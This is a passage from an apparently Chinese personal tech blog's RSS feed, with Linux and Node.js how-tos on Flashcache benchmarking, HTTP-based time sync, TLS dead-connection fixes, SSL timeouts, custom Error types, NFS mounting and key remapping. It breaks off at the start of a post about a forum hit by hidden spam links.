       [ 2130.514798] flashcache: Unknown symbol dm_kcopyd_copy (err 0)<br  />
       [ 2130.514821] flashcache: Unknown symbol dm_register_target (err 0)<br  />
       [ 2130.514846] flashcache: Unknown symbol dm_kcopyd_client_destroy (err 0)<br  />
       [ 2130.514870] flashcache: Unknown symbol dm_table_get_mode (err 0)<br  />
       [ 2130.514895] flashcache: Unknown symbol dm_io (err 0)<br  />
       [ 2130.514915] flashcache: Unknown symbol dm_get_device (err 0)
</p>
</blockquote>

<p>
先挂载 <code>dm-mod</code> 模块再挂载 <code>flashcache</code> 模块即可：
</p>

<div class="org-src-container">

<pre class="src src-sh">sudo modprobe dm-mod
sudo insmod /lib/modules/<span style="color: #b294bb;">`uname -r`</span>/extra/flashcache/flashcache.ko
</pre>
</div>

<p>
参考：<a href="https://bbs.archlinux.org/viewtopic.php?id=30478">No entry for device-mapper found</a>
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">模拟实验</h2>
<div class="outline-text-2" id="text-3">
<p>
参考：<a href="http://my.oschina.net/renguijiayi/blog/303747">flashcache的实现与用法</a>
</p>

<ul class="org-ul">
<li>创建SSD模拟设备

<p>
使用内存文件模拟块设备（1G）
</p>

<div class="org-src-container">

<pre class="src src-sh">dd <span style="color: #f0c674;">if</span>=/dev/zero <span style="color: #f0c674;">of</span>=/dev/shm/ssd.img <span style="color: #f0c674;">bs</span>=1024k <span style="color: #f0c674;">count</span>=1024
sudo losetup /dev/loop1 /dev/shm/ssd.img
</pre>
</div>
</li>

<li>创建HDD模拟设备

<p>
使用普通磁盘文件模拟块设备（5G）
</p>

<div class="org-src-container">

<pre class="src src-sh">sudo dd <span style="color: #f0c674;">if</span>=/dev/zero <span style="color: #f0c674;">of</span>=/hdd.img <span style="color: #f0c674;">bs</span>=1024k <span style="color: #f0c674;">count</span>=5120
sudo losetup /dev/loop2 /hdd.img
</pre>
</div>
</li>

<li>创建Flashcache混合设备

<div class="org-src-container">

<pre class="src src-sh">sudo flashcache_create -p around cachedev /dev/loop1 /dev/loop2
sudo mkfs.ext4 /dev/mapper/cachedev
</pre>
</div>
</li>

<li>挂载Flashcache混合设备

<div class="org-src-container">

<pre class="src src-sh">sudo mkdir /data
sudo mount /dev/mapper/cachedev /data
</pre>
</div>
</li>
</ul>

<p>
/data目录下的数据读写就已经在使用Flashcache了。
</p>

<ul class="org-ul">
<li>创建用来测试的数据文件（1G）

<div class="org-src-container">

<pre class="src src-sh">dd <span style="color: #f0c674;">if</span>=/dev/urandom <span style="color: #f0c674;">of</span>=/dev/shm/test.dat <span style="color: #f0c674;">bs</span>=1024k <span style="color: #f0c674;">count</span>=1024
</pre>
</div>
</li>

<li>测算使用HDD写耗时

<div class="org-src-container">

<pre class="src src-sh">sudo sh -c <span style="color: #8abeb7;">'echo 1 &gt; /proc/sys/vm/drop_caches; time cp /dev/shm/test.dat /'</span>
</pre>
</div>

<p>
输出：
</p>

<pre class="example">
real    0m4.751s
user    0m0.000s
sys 0m0.600s
</pre>
</li>

<li>测算使用HDD读耗时

<div class="org-src-container">

<pre class="src src-sh">sudo sh -c <span style="color: #8abeb7;">'echo 1 &gt; /proc/sys/vm/drop_caches; time cp /test.dat /dev/shm/</span>
</pre>
</div>

<p>
输出：
</p>

<pre class="example">
real    0m10.580s
user    0m0.010s
sys 0m0.727s
</pre>
</li>

<li>测算使用Flashcache写耗时

<div class="org-src-container">

<pre class="src src-sh">sudo sh -c <span style="color: #8abeb7;">'echo 1 &gt; /proc/sys/vm/drop_caches; time cp /dev/shm/test.dat /data/'</span>
</pre>
</div>

<p>
输出：
</p>

<pre class="example">
real    0m7.363s
user    0m0.000s
sys 0m0.760s
</pre>
</li>

<li>测算使用Flashcache读耗时

<p>
第一轮测试（缓存预热）
</p>

<div class="org-src-container">

<pre class="src src-sh">sudo sh -c <span style="color: #8abeb7;">'echo 1 &gt; /proc/sys/vm/drop_caches; time cp /data/test.dat /dev/shm/'</span>
</pre>
</div>

<p>
输出：
</p>

<pre class="example">
real    0m9.557s
user    0m0.013s
sys 0m1.157s
</pre>

<p>
第二轮测试（缓存生效）
</p>

<div class="org-src-container">

<pre class="src src-sh">sudo sh -c <span style="color: #8abeb7;">'echo 1 &gt; /proc/sys/vm/drop_caches; time cp /data/test.dat /dev/shm/'</span>
</pre>
</div>

<p>
输出：
</p>

<pre class="example">
real    0m3.107s
user    0m0.000s
sys 0m0.850s
</pre>
</li>

<li>清除测试数据

<div class="org-src-container">

<pre class="src src-sh">sudo rm /test.dat /dev/shm/test.dat /data/test.dat
</pre>
</div>
</li>

<li>结果分析

<ul class="org-ul">
<li>Flashcache读性能： <b>提升70%</b>
</li>

<li>Flashcache写性能： <b>降低55%</b>
</li>
</ul>
<p>
因为使用了 <code>Write-Around</code> 方式，所以提升了读性能，降低了写性能。
</p>
</li>

<li>清除模拟环境

<div class="org-src-container">

<pre class="src src-sh">sudo umount /data
sudo dmsetup remove cachedev
sudo losetup -d /dev/loop1
sudo rm /dev/shm/ssd.img
sudo losetup -d /dev/loop2
sudo rm /hdd.img
sudo rmdir /data
</pre>
</div>
</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[linux下通过HTTP同步系统时间]]></title>
            <link>/article/linux-4e0b901a8fc7-http-540c6b657cfb7edf65f695f4.html</link>
            <guid>/article/linux-4e0b901a8fc7-http-540c6b657cfb7edf65f695f4.html</guid>
            <pubDate>Tue, 21 Apr 2015 03:54:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在 <code>NTP</code> 被禁用的网络环境下，可以通过 <code>HTTP</code> 协议从公开的网站（如：www.baidu.com）同步时间，因为HTTP响应通常会带一个Date字段，这是WEB服务器的系统时间，可以用它来设置本机时间。
</p>

<div class="org-src-container">

<pre class="src src-sh">sudo date --rfc-2822 -s <span style="color: #8abeb7;">"`curl -s -i -X HEAD --header "Connection: close" http:/</span><span style="color: #8abeb7; text-decoration: underline;">/www.baidu.com | grep -E '^Date: ' | awk -F ': ' '{print $2}'`"</span>
</pre>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Node.js服务器TCP死连接问题诊断]]></title>
            <link>/article/node.js-670d52a15668-tcp-6b7b8fde63a595ee98988bca65ad.html</link>
            <guid>/article/node.js-670d52a15668-tcp-6b7b8fde63a595ee98988bca65ad.html</guid>
            <pubDate>Thu, 16 Apr 2015 12:29:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
最近一段时间，由于开发工作开始跟嵌入式相关，开始遇到一个问题：TCP死连接。
</p>

<p>
TCP死连接症状是这样的：通信双方从一方系统上看已经断开（不存在），但是另一方系统上看却是连接中（ESTABLISHED状态）。
</p>

<p>
TCP死连接一般在一方（或中间线路上的设备）断电、死机后出现，此时由于另一方收不到断开连接的IP报文，会认为连接仍然存在，日积月累会耗光文件描述符空间从而导致性能下降，最终拒绝服务。
</p>

<p>
对付这种问题，一般需要双方都进行连接心跳检测。比如：连接空闲一段时间后一方发一个心跳请求，另一端回个心跳响应，心跳请求发送方一段时间后还收不到响应则认为连接已断开，心跳请求接收方一段时间内没有收到心跳请求也认为连接已断开。
</p>

<p>
需要注意到的是node.js的tls服务器端握手超时处理不当可能会导致TCP死连接出现，有问题的代码示例如下：
</p>

<div class="org-src-container">

<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">options</span> = {
<span style="background-color: #373b41;"> </span>   key: <span style="color: #8abeb7;">"..."</span>,
<span style="background-color: #373b41;"> </span>   cert: <span style="color: #8abeb7;">"..."</span>,
<span style="background-color: #373b41;"> </span>   handshakeTimeout: 10*1000,
<span style="background-color: #373b41;"> </span>   plain: <span style="color: #81a2be;">true</span>,
<span style="background-color: #373b41;"> </span>   ssl: <span style="color: #81a2be;">true</span>
};

<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">tlsServer</span> = tls.createServer(options, app).listen(5433, 8192, <span style="color: #b5bd68;">function</span>(){
<span style="background-color: #373b41;"> </span>   logger.log(<span style="color: #8abeb7;">'tls server listening on port 5433'</span>);
});

tlsServer.on(<span style="color: #8abeb7;">'clientError'</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">exception</span>, <span style="color: #f0c674;">socket</span>) {
<span style="background-color: #373b41;"> </span>   logger.warn(<span style="color: #8abeb7;">'tls server client('</span> + socket.remoteAddress + <span style="color: #8abeb7;">':'</span> + socket.remot<span style="text-decoration: underline;">ePort +</span><span style="color: #8abeb7; text-decoration: underline;">') error('</span><span style="text-decoration: underline;"> + exception + </span><span style="color: #8abeb7; text-decoration: underline;">')'</span><span style="text-decoration: underline;">);</span>
});
</pre>
</div>

<p>
上面的代码通过指定 <code>handshakeTimeout</code> 使用指定SSL握手超时时间，但是并未关闭底层的TCP连接，从而导致TCP连接泄露，在 <code>clientError</code> 事件处理函数中添加以下释放语句即可：
</p>

<div class="org-src-container">

<pre class="src src-js">socket.destroy();
</pre>
</div>

<p>
除了常见的断电、死机引起TCP死连接外，这里还有一个论坛帖子论坛其它原因：《<a href="http://serverfault.com/questions/504187/too-many-established-connections-left-open">Too many established connections left open</a>》。
</p>

<p>
另外还有 linux 内核的 tcp keepalive机制作为心跳解决方案：《<a href="http://machael.blog.51cto.com/829462/211989/">linux下使用TCP存活(keepalive)定时器</a>》。
</p>

<p>
谨记：除了主动通过连接发送数据外，其它情况下操作系统可能不会告诉你连接已经关闭了。
</p>

<p>
要彻底解决这个问题，除了要避免泄露（或忘记关闭）TCP连接外，要有心跳机制，还需要从代码层面进行防御性编程，如：对于读写操作设置超时时间，一旦超时主动关闭连接。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Archlinux安装文本语音合成（TTS）]]></title>
            <link>/article/archlinux-5b8988c56587672c8bed97f354086210ff08-tts-ff09.html</link>
            <guid>/article/archlinux-5b8988c56587672c8bed97f354086210ff08-tts-ff09.html</guid>
            <pubDate>Wed, 15 Apr 2015 12:21:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">安装 <code>festival</code></h2>
<div class="outline-text-2" id="text-1">
<div class="org-src-container">

<pre class="src src-sh">yaourt -S festival festival-english festival-us
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">测试运行</h2>
<div class="outline-text-2" id="text-2">
<div class="org-src-container">

<pre class="src src-sh"><span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"This is an example. Arch is the best."</span> | festival --tts
</pre>
</div>

<ul class="org-ul">
<li>修复错误 <code>Linux: can't open /dev/dsp</code>
</li>
</ul>

<p>
参考 <a href="https://wiki.archlinux.org/index.php/Festival#Can.27t_open_.2Fdev.2Fdsp">这里</a> 将以下内容添加到 <code>~/.festivalrc</code>
</p>

<div class="org-src-container">

<pre class="src src-lisp">(Parameter.set 'Audio_Method 'Audio_Command)
(Parameter.set 'Audio_Command <span style="color: #8abeb7;">"aplay -q -c 1 -t raw -f s16 -r $SR $FILE"</span>)
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">参考</h2>
<div class="outline-text-2" id="text-3">
<p>
<a href="https://wiki.archlinux.org/index.php/Festival">https://wiki.archlinux.org/index.php/Festival</a>
</p>

<p>
<a href="https://linuxtoy.org/archives/festival_on_ubuntu.html">https://linuxtoy.org/archives/festival_on_ubuntu.html</a></p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[SSL_read及SSL_write支持超时]]></title>
            <link>/article/ssl_read-53ca-ssl_write-652f63018d8565f6.html</link>
            <guid>/article/ssl_read-53ca-ssl_write-652f63018d8565f6.html</guid>
            <pubDate>Tue, 27 Jan 2015 06:29:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
原始的socket编程中 <code>read</code> 、 <code>write</code> 支持超时是很容易实现的，如使用 <code>select</code> 或者 <code>setsockopt</code> 设置读写超时并在 <code>read</code> 和 <code>write</code> 出错后根据 <code>errno</code> 判断是否为超时引起。
</p>

<p>
但是在 <code>SSL</code> 编程中对底层socket调用 <code>select</code> 以及使用 <code>errno</code> 行为是未定义的。
</p>

<p>
使用 <code>setsockopt</code> 在底层的socket上设置读写后， <code>SSL_read</code> 、 <code>SSL_write</code> 出错会返回ssl错误码 <code>SSL_ERROR_WANT_READ</code> 或 <code>SSL_ERROR_WANT_WRITE</code> ，
但是被信号中断或者底层SSL需要重新握手也会导致 <code>SSL_read</code> 、 <code>SSL_write</code> 返回同样的ssl错误码。
</p>

<p>
如果能够将信号屏蔽掉，并启用SSL自动重新握手，就能够实现 <code>SSL_read</code> 、 <code>SSL_write</code> 超时检测。
</p>

<ul class="org-ul">
<li>屏蔽信号

<p>
忽略应用产生的信号，如：
</p>

<div class="org-src-container">

<pre class="src src-c">signal(SIGPIPE, SIG_IGN);
signal(SIGCHLD, SIG_IGN);
</pre>
</div>
</li>

<li>在底层socket上设置超时

<div class="org-src-container">

<pre class="src src-c"><span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">timeval</span> <span style="color: #f0c674;">tv</span>;
tv.tv_sec  = 10;
tv.tv_usec = 0;
setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (<span style="color: #81a2be;">char</span>*)&amp;tv, <span style="color: #b5bd68;">sizeof</span>(<span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">timeval</span>));
setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (<span style="color: #81a2be;">char</span>*)&amp;tv, <span style="color: #b5bd68;">sizeof</span>(<span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">timeval</span>));
</pre>
</div>
</li>

<li>启用自动重新握手

<div class="org-src-container">

<pre class="src src-c">SSL_CTX_set_mode(ctx, SSL_MODE_AUTO_RETRY);
</pre>
</div>
</li>

<li><code>SSL_read</code> 和 <code>SSL_write</code> 判断是否超时出错

<div class="org-src-container">

<pre class="src src-c"><span style="color: #81a2be;">int</span> <span style="color: #f0c674;">readed</span> = SSL_read(ssl, data, size);
<span style="color: #b5bd68;">if</span> (readed &lt;= 0) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (SSL_get_error(ssl, readed) == SSL_ERROR_WANT_READ) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">timeout</span>
<span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">error</span>
<span style="background-color: #373b41;"> </span>   }
}

<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">writed</span> = SSL_write(ssl, data, size);
<span style="color: #b5bd68;">if</span> (writed &lt;= 0) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (SSL_get_error(ssl, writed) == SSL_ERROR_WANT_WRITE) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">timeout</span>
<span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">error</span>
<span style="background-color: #373b41;"> </span>   }
}
</pre>
</div>
</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[理解node.js中的Error对象]]></title>
            <link>/article/740689e3-node.js-4e2d7684-error-5bf98c61.html</link>
            <guid>/article/740689e3-node.js-4e2d7684-error-5bf98c61.html</guid>
            <pubDate>Tue, 09 Dec 2014 05:38:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
Error对象在 <a href="http://nodejs.org">node.js</a> 程序中无处不在，但是关于它在 <a href="http://nodejs.org/docs/latest/api/all.html">node.js文档</a> （写这篇文章时node.js的最新版本为v0.10.33）中却找不到描述资料，只在以下部分提及：
</p>

<dl class="org-dl">
<dt> <a href="http://nodejs.org/docs/latest/api/all.html#all_util_iserror_object">util.isError(object)</a> </dt><dd>判断对象是否为Error对象.
</dd>

<dt> <a href="http://nodejs.org/docs/latest/api/all.html#all_additions_to_error_objects">Domain: Additions to Error objects</a> </dt><dd>在Error对象上附加额外的字段.
</dd>
</dl>

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">Error到底是何方神圣？</h2>
<div class="outline-text-2" id="text-1">
<p>
Error对象是在ECMAScript 5.1（于2011年7月发布）中 <a href="http://www.ecma-international.org/ecma-262/5.1/#sec-15.11">定义</a> 的，是一个比较新的特性：
</p>

<blockquote>
<p>
Instances of Error objects are thrown as exceptions when runtime errors occur. The Error objects may also serve as base objects for user-defined exception classes.
</p>
</blockquote>

<p>
它只有两个属性：
</p>

<dl class="org-dl">
<dt> name </dt><dd>错误名称，默认为"Error"
</dd>

<dt> message </dt><dd>错误消息，默认为""
</dd>
</dl>

<p>
V8实现了一个扩展属性：
</p>

<dl class="org-dl">
<dt> stack </dt><dd>错误描述及调用堆栈 
</dd>
</dl>

<p>
它只有一个方法：
</p>

<dl class="org-dl">
<dt> toString </dt><dd>转成字符串形式，通常为 "name: message"
</dd>
</dl>

<p>
构造一个Error实例：
</p>

<p>
new Error(message) 或者 Error(message)，两者是一样的。
</p>

<p>
示例：显示错误消息
</p>

<div class="org-src-container">

<pre class="src src-js">console.log(err);
console.log(err.toString());
console.log(err.message);
</pre>
</div>

<p>
需要注意的是console.log(JSON.stringify(err))显示的是空对象{}.
</p>

<p>
示例：显示错误消息及调用堆栈
</p>

<div class="org-src-container">

<pre class="src src-js">console.log(err.stack);
</pre>
</div>

<p>
示例：显示错误名称
</p>

<div class="org-src-container">

<pre class="src src-js">console.log(err.name);
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">如何自定义Error类型？</h2>
<div class="outline-text-2" id="text-2">
<div class="org-src-container">

<pre class="src src-js"><span style="color: #b5bd68;">function</span> <span style="color: #de935f;">MyError</span>(<span style="color: #f0c674;">message</span>) {
<span style="background-color: #373b41;"> </span> <span style="color: #81a2be;">this</span>.message = message || <span style="color: #8abeb7;">''</span>;
}

MyError.<span style="color: #81a2be;">prototype</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Error</span>();
MyError.<span style="color: #81a2be;">prototype</span>.constructor = MyError;
MyError.<span style="color: #81a2be;">prototype</span>.name = <span style="color: #8abeb7;">'MyError'</span>;
</pre>
</div>

<p>
Error实例类型判断
</p>

<div class="org-src-container">

<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">err</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Error</span>(<span style="color: #8abeb7;">"this is error"</span>);
<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">myerr</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">MyError</span>(<span style="color: #8abeb7;">"this is my error"</span>);
err <span style="color: #b5bd68;">instanceof</span> <span style="color: #81a2be;">Error</span> <span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">true*/</span>
err <span style="color: #b5bd68;">instanceof</span> <span style="color: #81a2be;">MyError</span> <span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">false*/</span>
myerr <span style="color: #b5bd68;">instanceof</span> <span style="color: #81a2be;">MyError</span> <span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">true*/</span>
myerr <span style="color: #b5bd68;">instanceof</span> <span style="color: #81a2be;">Error</span> <span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">true*/</span>
</pre>
</div>

<p>
stack输出有问题：自定义的错误描述没了
</p>

<div class="org-src-container">

<pre class="src src-js">err.stack <span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">'Error: this is error\n    at repl:1:11 ...*/</span>
myerr.stack <span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">'MyError\n    at repl:1:21 ...*/</span>
</pre>
</div>

<p>
修复node.js下MyError的stack不正确的问题
</p>

<div class="org-src-container">

<pre class="src src-js"><span style="color: #b5bd68;">function</span> <span style="color: #de935f;">MyError</span>(<span style="color: #f0c674;">message</span>) {
<span style="background-color: #373b41;"> </span> Error.captureStackTrace(<span style="color: #81a2be;">this</span>, <span style="color: #81a2be;">this</span>.constructor)
<span style="background-color: #373b41;"> </span> <span style="color: #81a2be;">this</span>.message = message || <span style="color: #8abeb7;">''</span>;
}

MyError.<span style="color: #81a2be;">prototype</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Error</span>();
MyError.<span style="color: #81a2be;">prototype</span>.constructor = MyError;
MyError.<span style="color: #81a2be;">prototype</span>.name = <span style="color: #8abeb7;">'MyError'</span>;
</pre>
</div>

<p>
<b>最终版：更node.js化一些</b>
</p>

<div class="org-src-container">

<pre class="src src-js"><span style="color: #b5bd68;">function</span> <span style="color: #de935f;">MyError</span>(<span style="color: #f0c674;">message</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (!(<span style="color: #81a2be;">this</span> <span style="color: #b5bd68;">instanceof</span> <span style="color: #81a2be;">MyError</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">MyError</span>(message);
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   Error.captureStackTrace(<span style="color: #81a2be;">this</span>, <span style="color: #81a2be;">this</span>.constructor)
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">this</span>.message = message || <span style="color: #8abeb7;">''</span>;
}

util.inherits(MyError, Error)
MyError.<span style="color: #81a2be;">prototype</span>.name = <span style="color: #8abeb7;">'MyError'</span>;
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">参考</h2>
<div class="outline-text-2" id="text-3">
<dl class="org-dl">
<dt> <a href="https://docs.nodejitsu.com/articles/errors/what-is-the-error-object">What is the error object?</a> </dt><dd>对Error对象的成员有所提及，但与当前的node.js版本不一致。
</dd>

<dt> <a href="https://cnodejs.org/topic/52090bc944e76d216af25f6f">Node.js下自定义错误类型</a> </dt><dd>教你如何自定义错误类型。
</dd>

<dt> <a href="http://stackoverflow.com/questions/10624873/what-properties-does-nodejs-expresss-error-object-exposes">What properties does nodejs express's Error object exposes?</a> </dt><dd>讨论Error对象相关属性
</dd>

<dt> <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error">MDN &gt; Web technology for developers &gt; JavaScript &gt; JavaScript reference &gt; Standard built-in objects &gt; Error</a> </dt><dd>Error对象参考文档
</dd>

<dt> <a href="http://www.ecma-international.org/ecma-262/5.1/#sec-15.11">Error Objects</a> </dt><dd>Error对象标准文档
</dd>
</dl>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[在linux使用nfs挂载其它linux机器上的文件夹]]></title>
            <link>/article/5728-linux-4f7f7528-nfs-63028f7d51765b83-linux-673a56684e0a768465874ef65939.html</link>
            <guid>/article/5728-linux-4f7f7528-nfs-63028f7d51765b83-linux-673a56684e0a768465874ef65939.html</guid>
            <pubDate>Tue, 23 Sep 2014 08:52:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
下面的IP地址以及工作目录需按实际情况进行修改。
</p>

<ul class="org-ul">
<li>在本地机器上允许目录被远程挂载

<div class="org-src-container">

<pre class="src src-sh"><span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">'/home/tangxinfa/workdir *(rw,sync,no_root_squash)'</span> &gt;&gt; /etc/exports
sudo exportfs -arv
</pre>
</div>
</li>

<li>在远程机器上挂载本地机器上的文件夹

<div class="org-src-container">

<pre class="src src-sh">mkdir /tmp/Projects; mount -t nfs -o nolock 192.168.111.100:/home/tangxinfa/Proj<span style="text-decoration: underline;">ects /tmp/Projects</span>
</pre>
</div>
</li>
</ul>

<p>
问题诊断
</p>

<ul class="org-ul">
<li>mount: RPC: Unable to receive; errno = Connection refused

<p>
需要启动nfs-server服务：
</p>

<div class="org-src-container">

<pre class="src src-sh">sudo systemctl enable nfs-server.service
sudo systemctl start nfs-server.service
</pre>
</div>

<p>
另外，如果刚刚做了linux内核更新而没有重启系统也可能导致这个问题，重启一下再试。
</p>
</li>

<li>mount: 192.168.111.100:/home/tangxinfa/Projects failed, reason given by server: Permission denied

<p>
在/etc/exports文件中允许目录被远程挂载即可。</p>
</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Thinkpad T540p修复linux下触摸板按下时光标位置移动问题]]></title>
            <link>/article/thinkpad-t540p-4fee590d-linux-4e0b89e66478677f63094e0b65f6514968074f4d7f6e79fb52a895ee9898.html</link>
            <guid>/article/thinkpad-t540p-4fee590d-linux-4e0b89e66478677f63094e0b65f6514968074f4d7f6e79fb52a895ee9898.html</guid>
            <pubDate>Mon, 22 Sep 2014 06:29:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li>执行以下设置命令即可

<div class="org-src-container">

<pre class="src src-sh">synclient <span style="color: #f0c674;">HorizHysteresis</span>=30 <span style="color: #f0c674;">VertHysteresis</span>=30
</pre>
</div>

<p>
将上面的命令放到~/.xprofile中，以便重启后仍然生效。
</p>
</li>
</ul>

<p>
参考：<a href="https://blog.lnx.cx/2014/03/20/fedora-20-and-the-thinkpad-t440s-touchpad/">Fedora 20 and the ThinkPad T440s touchpad | Technitribe</a></p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[linux下修改键位映射]]></title>
            <link>/article/linux-4e0b4fee6539952e4f4d66205c04.html</link>
            <guid>/article/linux-4e0b4fee6539952e4f4d66205c04.html</guid>
            <pubDate>Fri, 19 Sep 2014 06:07:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在linux下会大量使用ctrl和alt键，但是普通键盘上这两个键所在位置太偏，按起来非常吃力，交换键位可以很好的解决这个问题。
</p>

<ul class="org-ul">
<li>通过gnome-tweak-tool进行修改

<p>
Typing页可以完成常用的修改，如：交换Caps Lock和Ctrl，交换左Ctrl和Alt。但是在我的笔记本上设置好后有时候会失效.
</p>
</li>

<li>通过setxkbmap命令进行修改

<p>
Caps Lock改为Ctrl：setxkbmap -option ctrl:nocaps
</p>

<p>
可以查看/usr/share/X11/xkb/rules/evdev.lst查看支持的交换方式。Ctrl和Alt交换试了一下没有效果。
</p>

<p>
将setxkbmap设置命令放到~/.xprofile中即可开机生效。
</p>
</li>
</ul>


<ul class="org-ul">
<li>通过配置~/.Xmodmap进行修改

<p>
可以完成任意的键盘映射。
</p>

<p>
如下所示：Caps Lock改为Ctrl，左Ctrl改为Alt：
</p>

<pre class="example">
keycode 66 = Control_L
clear Lock
add control = Control_L

clear control
clear mod1
keycode 37 = Alt_L Meta_L
add control = Control_L Control_R
add mod1 = Alt_L Meta_L
</pre>

<p>
启用设置：
</p>

<div class="org-src-container">

<pre class="src src-sh">xmodmap ~/.Xmodmap
</pre>
</div>

<p>
在~/.xprofile中添加以上指令以便开机生效：
</p>

<div class="org-src-container">

<pre class="src src-sh"><span style="color: #b5bd68;">if</span> [ -f $<span style="color: #f0c674;">HOME</span>/.Xmodmap ]; <span style="color: #b5bd68;">then</span>
<span style="background-color: #373b41;"> </span>   /usr/bin/xmodmap $<span style="color: #f0c674;">HOME</span>/.Xmodmap
<span style="color: #b5bd68;">fi</span>
</pre>
</div>

<p>
参考：
</p>

<ul class="org-ul">
<li><a href="http://earthviaradio.wordpress.com/2012/02/06/swapping-the-left-alt-and-ctrl-keys-in-ubuntu-11-10/">Swapping the left Alt and Ctrl keys in Ubuntu 11.10</a>
</li>

<li><a href="http://efod.se/writings/linuxbook/html/caps-lock-to-ctrl.html">Changing your caps lock into Ctrl in X</a>
</li>

<li><a href="https://wiki.archlinux.org/index.php/Xmodmap_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">Xmodmap (简体中文)</a>
</li>
</ul>
</li>

<li>清除xmodmap以及setxkbmap的配置

<div class="org-src-container">

<pre class="src src-sh">setxkbmap -layout us
</pre>
</div>
</li>

<li>换hhkb pro2键盘

<p>
linux用户必备，ctrl和alt键已经放置到最优位置，而且后面的跳线开关支持常用的键位交换，即使是linux文本模式下也可用。</p>
</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[论坛被挂暗链问题分析与解决]]></title>
            <link>/article/8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html</link>
            <guid>/article/8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html</guid>
            <pubDate>Tue, 01 Apr 2014 13:38:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">发现问题</h2>
<div class="outline-text-2" id="text-1">
<p>
有网友反映我们的论坛被挂了暗链，具体表现为从 <code>google</code> 搜索论坛名称结果如下图所示：
</p>


<div class="figure">
<p><img src="../static/site_attacked.png" alt="site_attacked.png" />
</p>
</div>

<p>
直接搜索论坛网址出现的一些热门帖子也被挂了暗链，通过 <code>google</code> 搜索结果访问会跳到恶意网站，
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">解决问题</h2>
<div class="outline-text-2" id="text-2">
<p>
直接通过网址访问论坛则没有任务问题，应该是论坛被注入了恶意代码，一时没被发现。
</p>

<ul class="org-ul">
